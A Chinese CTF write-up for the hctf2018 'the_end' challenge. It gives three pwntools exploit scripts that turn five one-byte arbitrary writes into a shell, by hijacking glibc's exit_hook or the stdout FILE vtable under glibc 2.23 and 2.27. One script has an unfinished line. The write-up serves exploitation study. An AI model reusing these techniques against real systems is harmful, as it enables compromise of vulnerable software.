# [原创]hctf2018_the_end（IO FILE attack和exit_hook attack） 

前一阵ciscn半决赛的时候几乎遇到了 跟这个一模一样的题。当时是基于2.23下打的io file。但是我赛后想了一下，这道题能考察的利用点还挺多的，可以作为一道很好的多解题来总结，于是这件事情就拖到了现在才做。准备总结一下在2.23和2.27两个版本下可以打的点。

## 程序分析

main 函数伪代码如下：

```c
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  signed int i; // [rsp+4h] [rbp-Ch]
  void *buf; // [rsp+8h] [rbp-8h]

  sleep(0);
  printf("here is a gift %p, good luck ;)\n", &sleep);
  fflush(_bss_start);
  close(1);
  close(2);
  for ( i = 0; i <= 4; ++i )                    // 对任意地址写5次
  {
    read(0, &buf, 8uLL);
    read(0, buf, 1uLL);
  }
  exit(0x539);
}
```

## 劫持exit_hook

exit调用流程如下：

```
exit()->__run_exit_handlers->_dl_fini->__rtld_lock_unlock_recursive
```

我们劫持__rtld_lock_unlock_recursive 而这个函数是在_rtld_global结构体中的一个函数。
偏移计算如下：

使用 pwndbg 查找 `_rtld_global` 结构体的地址：

```bash
pwndbg> search -8 0x7f138b251c90
warning: Unable to access 16000 bytes of target memory at 0x7f138b04ed87, halting search.
Searching for value: b'\x90\x1c%\x8b\x13\x7f\x00\x00'
$3 = (struct rtld_global *) 0x7f138b477f40 <_rtld_global>
pwndbg> p /x 0x7f138b477f48-0x7f138b477f40
$4 = 0x8
pwndbg> p /x 0x7f138b477f48
$5 = 0x7f138b477f48 <_rtld_global+3848>      0x0000f138b251c90
```


```python
# encoding=utf-8
from pwn import *
from LibcSearcher import *
s = lambda buf: io.send(buf)
sl = lambda buf: io.sendline(buf)
sa = lambda delim, buf: io.sendafter(delim, buf)
sal = lambda delim, buf: io.sendlineafter(delim, buf)
shell = lambda: io.interactive()
r = lambda n=None: io.recv(n)
ra = lambda t=tube.forever:io.recvall(t)
ru = lambda delim: io.recvuntil(delim)
rl = lambda: io.recvline()
rls = lambda n=2**20: io.recvlines(n)
 
libc_path = "/lib/x86_64-linux-gnu/libc-2.23.so"
elf_path = "./the_end"
libc = ELF(libc_path)
elf = ELF(elf_path)
#io = remote("node3.buuoj.cn",26000)
if sys.argv[1]=='1':
    context(log_level = 'debug',terminal= '/bin/zsh', arch = 'amd64', os = 'linux')
elif sys.argv[1]=='0':
    context(log_level = 'info',terminal= '/bin/zsh', arch = 'amd64', os = 'linux')
#io = process([elf_path],env={"LD_PRELOAD":libc_path})
 
 
 
 
cho=''      # choice提示语
siz=''     # size输入提示语
con=''         # content输入提示语
ind=''      # index输入提示语
edi=''          # edit输入提示语
def add(size,content='',c='1'):
    sal(cho,c)
    pass
def free(index,c=''):
    sal(cho,c)
    pass
def show(index,c=''):
    sal(cho,c)
    pass
def edit(index,content='',c=''):
    sal(cho,c)
    pass
# 获取pie基地址
def get_proc_base(p):
    proc_base = p.libs()[p._cwd+p.argv[0].strip('.')]
    info(hex(proc_base))
 
# 获取libc基地址  
def get_libc_base(p):
    libc_base = p.libs()[libc_path]
    info(hex(libc_base))
 
def exp():
    global io
    io = process(elf_path)
    get_proc_base(io)
    get_libc_base(io)
    ru("here is a gift ")
    libc.address =  int(r(len("0x7f7819bef2b0")),16)-libc.sym['sleep']
    success("libc:"+hex(libc.address))
 
 
    ogg = libc.address+#
    info("ogg:"+hex(ogg))
    _rtld_global = libc.address+0x5f0040
    success("_rtld_global:"+hex(_rtld_global))
    __rtld_lock_unlock_recursive = _rtld_global+0xf08
    success("__rtld_lock_unlock_recursive :"+hex(__rtld_lock_unlock_recursive))
 
    pause()
    s(p64(__rtld_lock_unlock_recursive))
    s(p8(ogg&0xff))
    info(hex(ogg&0xff))
 
    s(p64(__rtld_lock_unlock_recursive+1))
    s(p8((ogg>>8)&0xff))
    info(hex((ogg>>8)&0xff))
 
    s(p64(__rtld_lock_unlock_recursive+2))
    s(p8((ogg>>16)&0xff))
    info(hex((ogg>>16)&0xff))
 
    s(p64(__rtld_lock_unlock_recursive+3))
    s(p8((ogg>>24)&0xff))
    info(hex((ogg>>24)&0xff))
 
    s(p64(__rtld_lock_unlock_recursive+4))
    s(p8((ogg>>32)&0xff))
    info(hex((ogg>>32)&0xff))
    sl("cat flag>&0")
    shell()
exp()
```

## 劫持vtable

由于是2.23下，没有vtable保护，所以可以劫持stdout的虚表指针，把假的虚表构造在stderr上，然后伪造虚表对应位置的_setbuf 函数.程序调用 exit 后,会遍历 _IO_list_all ,调用 _IO_2_1_stdout_ 下的 vatable 中 _setbuf 函数。

```python
# encoding=utf-8
from pwn import *
from LibcSearcher import *
s = lambda buf: io.send(buf)
sl = lambda buf: io.sendline(buf)
sa = lambda delim, buf: io.sendafter(delim, buf)
sal = lambda delim, buf: io.sendlineafter(delim, buf)
shell = lambda: io.interactive()
r = lambda n=None: io.recv(n)
ra = lambda t=tube.forever:io.recvall(t)
ru = lambda delim: io.recvuntil(delim)
rl = lambda: io.recvline()
rls = lambda n=2**20: io.recvlines(n)
 
libc_path = "/lib/x86_64-linux-gnu/libc-2.23.so"
elf_path = "./the_end"
libc = ELF(libc_path)
elf = ELF(elf_path)
#io = remote("node3.buuoj.cn",26000)
if sys.argv[1]=='1':
    context(log_level = 'debug',terminal= '/bin/zsh', arch = 'amd64', os = 'linux')
elif sys.argv[1]=='0':
    context(log_level = 'info',terminal= '/bin/zsh', arch = 'amd64', os = 'linux')
#io = process([elf_path],env={"LD_PRELOAD":libc_path})
 
 
 
 
cho=''      # choice提示语
siz=''     # size输入提示语
con=''         # content输入提示语
ind=''      # index输入提示语
edi=''          # edit输入提示语
def add(size,content='',c='1'):
    sal(cho,c)
    pass
def free(index,c=''):
    sal(cho,c)
    pass
def show(index,c=''):
    sal(cho,c)
    pass
def edit(index,content='',c=''):
    sal(cho,c)
    pass
# 获取pie基地址
def get_proc_base(p):
    proc_base = p.libs()[p._cwd+p.argv[0].strip('.')]
    info(hex(proc_base))
 
# 获取libc基地址  
def get_libc_base(p):
    libc_base = p.libs()[libc_path]
    info(hex(libc_base))
def change(addr1,byte):
    s(p64(addr1))
    s(p8(byte))
def exp():
    global io
    io = process(elf_path)
    get_proc_base(io)
    get_libc_base(io)
    ru("here is a gift ")
    libc.address =  int(r(len("0x7f7819bef2b0")),16)-libc.sym['sleep']
    success("libc:"+hex(libc.address))
 
    ru("good luck ;)")
    ogg = libc.address+0xf0364
    stdout_vtable_ptr = libc.sym['_IO_2_1_stdout_']+0xd8
    stderr_vtable_ptr = libc.sym['_IO_2_1_stderr_']+0xd8    # 虚表劫持
    success("stdout_addr:"+hex(stdout_vtable_ptr))
    success("stderr_addr:"+hex(stderr_vtable_ptr))
    fake_vtable_addr = stderr_vtable_ptr-0x58          # fake虚表的位置
    success("fake vtable addr:"+hex(fake_vtable_addr))
 
 
    change(stdout_vtable_ptr,(fake_vtable_addr&0xff))
    change(stdout_vtable_ptr+1,((fake_vtable_addr>>8)&0xff))   #劫持stdout结构体的虚表指针指向fake table的位置(_IO_2_1_stderr_+128)
 
    ogg = libc.address+0x45226
    success("ogg:"+hex(ogg))
    change(stderr_vtable_ptr,ogg&0xff)
    change(stderr_vtable_ptr+1,((ogg>>8)&0xff))
    change(stderr_vtable_ptr+2,((ogg>>16)&0xff))
    shell()
exp()
```

注意最后cat flag的时候要绑定一下输出流到0号

## glibc2.27

在2.27下有了对于虚表指针的验证，所以直接劫持变得不可行。所以还是打exit_hook。注意_rtld_global是ld里的符号

```python
# encoding=utf-8
from pwn import *
from LibcSearcher import *
s = lambda buf: io.send(buf)
sl = lambda buf: io.sendline(buf)
sa = lambda delim, buf: io.sendafter(delim, buf)
sal = lambda delim, buf: io.sendlineafter(delim, buf)
shell = lambda: io.interactive()
r = lambda n=None: io.recv(n)
ra = lambda t=tube.forever:io.recvall(t)
ru = lambda delim: io.recvuntil(delim)
rl = lambda: io.recvline()
rls = lambda n=2**20: io.recvlines(n)
 
libc_path = "/lib/x86_64-linux-gnu/libc-2.27.so"
elf_path = "./the_end"
libc = ELF(libc_path)
elf = ELF(elf_path)
#io = remote("node3.buuoj.cn",26000)
if sys.argv[1]=='1':
    context(log_level = 'debug',terminal= '/bin/zsh', arch = 'amd64', os = 'linux')
elif sys.argv[1]=='0':
    context(log_level = 'info',terminal= '/bin/zsh', arch = 'amd64', os = 'linux')
#io = process([elf_path],env={"LD_PRELOAD":libc_path})
 
 
 
 
cho=''      # choice提示语
siz=''     # size输入提示语
con=''         # content输入提示语
ind=''      # index输入提示语
edi=''          # edit输入提示语
def add(size,content='',c='1'):
    sal(cho,c)
    pass
def free(index,c=''):
    sal(cho,c)
    pass
def show(index,c=''):
    sal(cho,c)
    pass
def edit(index,content='',c=''):
    sal(cho,c)
    pass
# 获取pie基地址
def get_proc_base(p):
    proc_base = p.libs()[p._cwd+p.argv[0].strip('.')]
    info(hex(proc_base))
 
# 获取libc基地址 
def get_libc_base(p):
    libc_base = p.libs()[libc_path]
    info(hex(libc_base))
 
def exp():
    global io
    #io = process(elf_path)
    io = remote("node3.buuoj.cn",29679)
    #get_proc_base(io)
    #get_libc_base(io)
    ru("here is a gift ")
    libc.address =  int(r(len("0x7f7819bef2b0")),16)-libc.sym['sleep']
    ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')
    ld.address = libc.address+0x3f1000
    success("libc:"+hex(libc.address))
    success("ld:"+hex(ld.address))
 
 
 
    ogg = libc.address+0x4f322
    info("ogg:"+hex(ogg))
    _rtld_global = ld.sym['_rtld_global']
    success("_rtld_global:"+hex(_rtld_global))
    __rtld_lock_unlock_recursive = _rtld_global+0xf08
    success("__rtld_lock_unlock_recursive :"+hex(__rtld_lock_unlock_recursive))
 
    pause()
    s(p64(__rtld_lock_unlock_recursive))
    s(p8(ogg&0xff))
    info(hex(ogg&0xff))
 
    s(p64(__rtld_lock_unlock_recursive+1))
    s(p8((ogg>>8)&0xff))
    info(hex((ogg>>8)&0xff))
 
    s(p64(__rtld_lock_unlock_recursive+2))
    s(p8((ogg>>16)&0xff))
    info(hex((ogg>>16)&0xff))
 
    s(p64(__rtld_lock_unlock_recursive+3))
    s(p8((ogg>>24)&0xff))
    info(hex((ogg>>24)&0xff))
 
    s(p64(__rtld_lock_unlock_recursive+4))
    s(p8((ogg>>32)&0xff))
    info(hex((ogg>>32)&0xff))
    sl('exec 1>&0')
    shell()
exp()
```